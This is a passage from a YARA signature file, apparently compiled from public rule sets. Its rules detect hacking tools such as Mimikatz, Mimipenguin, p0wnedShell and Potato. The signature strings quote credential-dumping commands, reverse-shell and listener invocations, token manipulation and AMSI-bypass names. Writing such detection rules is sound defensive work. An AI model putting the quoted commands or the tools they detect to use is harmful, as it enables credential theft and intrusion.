\"Mimikatz_Memory_Rule_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"sekurlsa::\" ascii\n        $x1 = \"cryptprimitives.pdb\" ascii\n        $x2 = \"Now is t1O\" ascii fullword\n        $x4 = \"ALICE123\" ascii\n        $x5 = \"BOBBY456\" ascii\n\n    condition:\n        $s0 and 1 of ($x*)\n}\n\nrule Mimikatz\n{\n    meta:\n        description = \"Mimikatz: credential dump tool\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Benjamin DELPY (gentilkiwi)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"mimikatz\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $exe_x86_1 = { 89 71 04 89 [0-3] 30 8d 04 bd }\n        $exe_x86_2 = { 8b 4d e? 8b 45 f4 89 75 e? 89 01 85 ff 74 }\n        $exe_x64_1 = { 33 ff 4? 89 37 4? 8b f3 45 85 c? 74}\n        $exe_x64_2 = { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }\n        $dll_1 = { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }\n        $dll_2 = { c7 0? 10 02 00 00 ?? 89 4? }\n        $sys_x86 = { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }\n        $sys_x64 = { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }\n\n    condition:\n        (all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))\n}\n\nrule Mimikatz_Logfile\n{\n    meta:\n        description = \"Log file generated by Mimikatz credential dumper\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Mimikatz_Logfile\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SID               :\" ascii fullword\n        $s2 = \"* NTLM     :\" ascii fullword\n        $s3 = \"Authentication Id :\" ascii fullword\n        $s4 = \"wdigest :\" ascii fullword\n\n    condition:\n        all of them\n}\n\nrule Mimikatz_Strings\n{\n    meta:\n        description = \"Mimikatz: credential dump tool (strings)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Mimikatz_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"sekurlsa::logonpasswords\" fullword wide ascii\n        $x2 = \"List tickets in MIT/Heimdall ccache\" fullword ascii wide\n        $x3 = \"kuhl_m_kerberos_ptt_file ; LsaCallKerberosPackage %08x\" fullword ascii wide\n        $x4 = \"* Injecting ticket :\" fullword wide ascii\n        $x5 = \"mimidrv.sys\" fullword wide ascii\n        $x6 = \"Lists LM & NTLM credentials\" fullword wide ascii\n        $x7 = \"\\\\_ kerberos -\" fullword wide ascii\n        $x8 = \"* unknow   :\" fullword wide ascii\n        $x9 = \"\\\\_ *Password replace ->\" fullword wide ascii\n        $x10 = \"KIWI_MSV1_0_PRIMARY_CREDENTIALS KO\" ascii wide\n        $x11 = \"\\\\\\\\.\\\\mimidrv\" wide ascii\n        $x12 = \"Switch to MINIDUMP :\" fullword wide ascii\n        $x13 = \"[masterkey] with password: %s (%s user)\" fullword wide\n        $x14 = \"Clear screen (doesn't work with redirections, like PsExec)\" fullword wide\n        $x15 = \"** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\" fullword wide\n        $x16 = \"[masterkey] with DPAPI_SYSTEM (machine, then user): \" fullword wide\n\n    condition:\n        ((uint16(0) == 0x5a4d and 1 of ($x*)) or (3 of them)) and not pe.imphash() == \"77eaeca738dd89410a432c6bd6459907\"\n}\n\nrule Mimikatz_AppInitHook\n{\n    meta:\n        description = \"AppInitGlobalHooks-Mimikatz: hide Mimikatz from process lists (file: AppInitHook.dll)\"\n        ref = \"https://goo.gl/Z292v6\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"AppInitHook\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Release\\\\AppInitHook.pdb\" ascii\n        $s1 = \"AppInitHook.dll\" fullword ascii\n        $s2 = \"mimikatz.exe\" fullword wide\n        $s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n        $s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n        $s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n        $s6 = \"VoidFunc\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule Mimikatz_MSBuild_Execution_via_XML\n{\n    meta:\n        description = \"XML that executes Mimikatz on an endpoint via MSBuild\"\n        ref = \"https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MSBuild_Mimikatz_Execution_via_XML\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"<Project ToolsVersion=\" ascii\n        $x2 = \"</SharpLauncher>\" fullword ascii\n        $s1 = \"\\\"TVqQAAMAAAA\" ascii\n        $s2 = \"System.Convert.FromBase64String(\" ascii\n        $s3 = \".Invoke(\" ascii\n        $s4 = \"Assembly.Load(\" ascii\n        $s5 = \".CreateInstance(\" ascii\n\n    condition:\n        all of them\n}\n\nrule Mimikatz_Gen_Strings\n{\n    meta:\n        description = \"Mimikatz: credential dump tool (strings)\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Mimikatz_Gen_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[*] '%s' service already started\" fullword wide\n        $s2 = \"** Security Callback! **\" fullword wide\n        $s3 = \"Try to export a software CA to a crypto (virtual)hardware\" fullword wide\n        $s4 = \"enterpriseadmin\" fullword wide\n        $s5 = \"Ask debug privilege\" fullword wide\n        $s6 = \"Injected =)\" fullword wide\n        $s7 = \"** SAM ACCOUNT **\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them)\n}\n\nrule Powerkatz_DLL_Generic\n{\n    meta:\n        description = \"Powerkatz: a Mimikatz version prepared to run in memory via PowerShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikatz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Powerkatz_DLL_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n        $s2 = \"%*s  pPublicKey         : \" fullword wide\n        $s4 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n        $s5 = \"\\\\*.kirbi\" fullword wide\n        $c1 = \"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n        $c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them) or 2 of them\n}\n\nrule Invoke_mimikittenz\n{\n    meta:\n        description = \"Mimikittenz: post-exploitation tool for extracting info from memory (file: Invoke-mimikittenz.ps1)\"\n        ref = \"https://github.com/putterpanda/mimikittenz\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimikittenz\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Invoke_mimikittenz\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"[mimikittenz.MemProcInspector]\" ascii\n        $s1 = \"PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |\" fullword ascii\n        $s2 = \"IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);\" fullword ascii\n        $s3 = \"&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=\" ascii\n        $s4 = \"[DllImport(\\\"kernel32.dll\\\", SetLastError = true)]\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 60KB and 2 of them) or $x1\n}\n\nrule Mimipenguin_SH\n{\n    meta:\n        description = \"Mimipenguin: Linux password dump tool\"\n        ref = \"https://github.com/huntergregal/mimipenguin\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimipenguin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Mimipenguin_SH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$(echo $thishash | cut -d'$' -f 3)\" ascii\n        $s2 = \"ps -eo pid,command | sed -rn '/gnome\\\\-keyring\\\\-daemon/p' | awk\" ascii\n        $s3 = \"MimiPenguin Results:\" ascii\n\n    condition:\n        1 of them\n}\n\nrule Mimipenguin_1\n{\n    meta:\n        description = \"Mimipenguin: Linux password dump tool\"\n        ref = \"https://github.com/huntergregal/mimipenguin\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimipenguin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"mimipenguin_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"self._strings_dump += strings(dump_process(target_pid))\" fullword ascii\n        $x2 = \"def _dump_target_processes(self):\" fullword ascii\n        $x3 = \"self._target_processes = ['sshd:']\" fullword ascii\n        $x4 = \"GnomeKeyringPasswordFinder()\" ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 20KB and 1 of them)\n}\n\nrule Mimipenguin_2\n{\n    meta:\n        description = \"Mimipenguin: Linux password dump tool\"\n        ref = \"https://github.com/huntergregal/mimipenguin\"\n        classifications = \"Hacktool\"\n        threat_names = \"Mimipenguin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"mimipenguin_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"DUMP=$(strings \\\"/tmp/dump.${pid}\\\" | grep -E\" fullword ascii\n        $x2 = \"strings /tmp/apache* | grep -E '^Authorization: Basic.+=$'\" fullword ascii\n        $x3 = \"grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A\" fullword ascii\n        $x4 = \"strings \\\"/tmp/dump.${pid}\\\" | grep -E -m 1 '^\\\\$.\\\\$.+\\\\$')\\\"\" fullword ascii\n        $x5 = \"if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 20KB and 1 of them)\n}\n\nrule Ncrack\n{\n    meta:\n        description = \"Ncrack: brute-force tool\"\n        classifications = \"Hacktool\"\n        threat_names = \"Ncrack\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ncrack\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"NcrackOutputTable only supports adding up to 4096 to a cell via\"\n\n    condition:\n        1 of them\n}\n\nrule Netview_Hacktool\n{\n    meta:\n        description = \"Netview: network domain enumeration tool (file: Nv.exe)\"\n        ref = \"https://github.com/mubix/netview\"\n        classifications = \"Hacktool\"\n        threat_names = \"Netview\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Netview_Hacktool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[+] %ws - Target user found - %s\\\\%s\" fullword wide\n        $s2 = \"[*] -g used without group specified - using \\\"Domain Admins\\\"\" fullword ascii\n        $s3 = \"[*] -i used without interval specified - ignoring\" fullword ascii\n        $s4 = \"[+] %ws - Session - %s from %s - Active: %d - Idle: %d\" fullword wide\n        $s5 = \"[+] %ws - Backup Domain Controller\" fullword wide\n        $s6 = \"[-] %ls - Share - Error: %ld\" fullword wide\n        $s7 = \"[-] %ls - Session - Error: %ld\" fullword wide\n        $s8 = \"[+] %s - OS Version - %d.%d\" fullword ascii\n        $s9 = \"Enumerating Logged-on Users\" fullword ascii\n        $s10 = \": Specifies a domain to pull a list of hosts from\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 2 of them) or 3 of them\n}\n\nrule Netview_Hacktool_Output\n{\n    meta:\n        description = \"Netview: network domain enumeration tool (file: filename.txt)\"\n        ref = \"https://github.com/mubix/netview\"\n        classifications = \"Hacktool\"\n        threat_names = \"Netview\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Netview_Hacktool_Output\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[*] Using interval:\" fullword\n        $s2 = \"[*] Using jitter:\" fullword\n        $s3 = \"[+] Number of hosts:\" fullword\n\n    condition:\n        2 of them\n}\n\nrule p0wnedShell_p0wnedPowerCat\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedPowerCat.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedPowerCat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Now if we point Firefox to http://127.0.0.1\" fullword ascii\n        $x2 = \"powercat -l -v -p\" fullword ascii\n        $x3 = \"P0wnedListener\" fullword ascii\n        $x4 = \"EncodedPayload.bat\" fullword ascii\n        $x5 = \"powercat -c \" fullword ascii\n        $x6 = \"Program.P0wnedPath()\" ascii\n        $x7 = \"Invoke-PowerShellTcpOneLine\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7375 and filesize < 150KB and 1 of them) or (2 of them)\n}\n\nrule p0wnedShell_p0wnedPotato\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedPotato.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedPotato\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Invoke-Tater\" fullword ascii\n        $x2 = \"P0wnedListener.Execute(WPAD_Proxy);\" fullword ascii\n        $x3 = \" -SpooferIP \" ascii\n        $x4 = \"TaterCommand()\" ascii\n        $x5 = \"FileName = \\\"cmd.exe\\\",\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule p0wnedShell_p0wnedExploits\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedExploits.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedExploits\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Pshell.RunPSCommand(Whoami);\" fullword ascii\n        $x2 = \"If succeeded this exploit should popup a System CMD Shell\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule p0wnedShell_p0wnedShellx64\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedShellx64.exe)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedShellx64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9Pjgb/+kPPhv9Sjp01Wf\" wide\n        $x2 = \"Invoke-TokenManipulation\" wide\n        $x3 = \"-CreateProcess \\\"cmd.exe\\\" -Username \\\"nt authority\\\\system\\\"\" fullword wide\n        $x4 = \"CommandShell with Local Administrator privileges :)\" fullword wide\n        $x5 = \"Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost \" fullword wide\n\n    condition:\n        1 of them\n}\n\nrule p0wnedShell_p0wnedListenerConsole\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedListenerConsole.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedListenerConsole\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Invoke_ReflectivePEInjection\" fullword wide\n        $x5 = \"p0wnedShell> \" fullword wide\n        $x6 = \"Resources.Get_PassHashes\" fullword wide\n        $s7 = \"Invoke_CredentialsPhish\" fullword wide\n        $s8 = \"Invoke_Shellcode\" fullword wide\n        $s9 = \"Resources.Invoke_TokenManipulation\" fullword wide\n        $s10 = \"Resources.Port_Scan\" fullword wide\n        $s20 = \"Invoke_PowerUp\" fullword wide\n\n    condition:\n        1 of them\n}\n\nrule p0wnedShell_p0wnedBinaries\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedBinaries.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedBinaries\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9\" ascii\n        $x2 = \"wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f\" ascii\n        $x3 = \"mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98\" ascii\n        $x4 = \"LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+\" ascii\n        $x5 = \"XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/\" ascii\n        $x6 = \"STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR\" ascii\n        $x7 = \"namespace p0wnedShell\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule p0wnedShell_p0wnedAmsiBypass\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (file: p0wnedAmsiBypass.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedAmsiBypass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Program.P0wnedPath()\" fullword ascii\n        $x2 = \"namespace p0wnedShell\" fullword ascii\n        $x3 = \"H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe\" ascii\n\n    condition:\n        1 of them\n}\n\nrule p0wnedShell_p0wnedShell_outputs\n{\n    meta:\n        description = \"p0wnedShell: PowerShell post-exploitation toolkit (files: p0wnedShell.cs, p0wnedShell.cs)\"\n        ref = \"https://github.com/Cn33liz/p0wnedShell\"\n        classifications = \"Hacktool\"\n        threat_names = \"p0wnedShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"p0wnedShell_outputs\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[+] For this attack to succeed, you need to have Admin privileges.\" fullword ascii\n        $s2 = \"[+] This is not a valid hostname, please try again\" fullword ascii\n        $s3 = \"[+] First return the name of our current domain.\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule Potato\n{\n    meta:\n        description = \"Potato: Windows privilege escalation tool\"\n        ref = \"https://github.com/foxglovesec/Potato, https://foxglovesecurity.com/2016/01/16/hot-potato/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Potato\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_hot_potato\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"Parsing initial NTLM auth...\" wide ascii\n        $a2 = \"Got PROPFIND for /test...\" wide ascii\n        $a3 = \"Starting NBNS spoofer...\" wide ascii\n        $a4 = \"Exhausting UDP source ports so DNS lookups will fail...\" wide ascii\n        $a5 = \"Usage: potato.exe -ip\" wide ascii\n\n    condition:\n        any of ($a*)\n}\n\nrule PowerShdll\n{\n    meta:\n        description = \"PowerShdll: run PowerShell with rundll32\"\n        ref = \"https://github.com/p3nt4/PowerShdll\"\n        classifications = \"Hacktool\"\n        threat_names = \"PowerShdll\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PowerShdll\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"rundll32 PowerShdll,main -f <path>\" fullword wide\n        $x2 = \"\\\\PowerShdll.dll\" fullword ascii\n        $x3 = \"rundll32 PowerShdll,main <script>\" fullword wide\n\n    condition:\n        1 of them\n}\n\nrule Powerstager\n{\n    meta:\n        description = \"PowerStager: PowerShell payload stager\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-powerstager-analysis/, https://github.com/z0noxz/powerstager\"\n        classifications = \"Hacktool\"\n        threat_names = \"PowerStager\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jeff White - jwhite@paloaltonetworks.com @noottrak\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Powerstager\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $filename = /%s\\\\[a-zA-Z0-9]{12}/\n        $pathname = \"TEMP\" wide ascii\n        $filedesc = \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit\" wide ascii\n        $apicall_01 = \"memset\"\n        $apicall_02 = \"getenv\"\n        $apicall_03 = \"fopen\"\n        $apicall_04 = \"memcpy\"\n        $apicall_05 = \"fwrite\"\n        $apicall_06 = \"fclose\"\n        $apicall_07 = \"CreateProcessA\"\n        $decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }\n        $decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }\n        $decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }\n        $decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }\n\n    condition:\n        uint16be(0) == 0x4D5A and all of ($apicall_*) and $filename and $pathname and $filedesc and (2 of ($decoder_x86*) or 2 of ($decoder_x64*))\n}\n\nrule PSAttack_EXE\n{\n    meta:\n        description = \"PS>Attack: PowerShell attack tool (file: PSAttack.exe)\"\n        ref = \"https://github.com/gdssecurity/PSAttack/releases/\"\n        classifications = \"Hacktool\"\n        threat_names = \"PS>Attack\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = 